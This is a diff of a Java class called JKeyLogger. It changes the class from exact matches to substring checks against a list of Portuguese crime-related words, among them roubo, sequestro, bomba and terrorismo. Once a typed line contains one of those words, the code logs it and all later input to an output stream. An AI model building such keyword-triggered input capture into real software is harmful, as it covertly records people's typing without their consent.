@@ -28,72 +28,79 @@ public class JKeyLogger {
                 
                 String texto = teclado.nextLine();
                 
-                switch (texto) {
-                    case "roubo":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "sequestro":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "assassinato":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "drogras":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "assalto":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "suicideo":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "bomba":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "terrorismo":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "armas":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "corrupcao":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "perigo":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    case "ameaca":
-                        while(teclado.hasNextLine()){
-                            ps.println(texto);
-                            texto = teclado.nextLine();
-                        }   break;
-                    default:
-                        break;
+                if(texto.contains("roubo")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
                 }
-            }    
-            
+                else if(texto.contains("sequestro")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("assassinato")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("drogas")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("assalto")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("suicideo")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("bomba")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("terrorismo")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("armas")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("corrupcao")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("perigo")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+                else if(texto.contains("ameaca")){
+                    while(teclado.hasNextLine()){
+                        ps.println(texto);
+                        texto = teclado.nextLine();
+                    }
+                }
+            }           
         }
     }  
 }
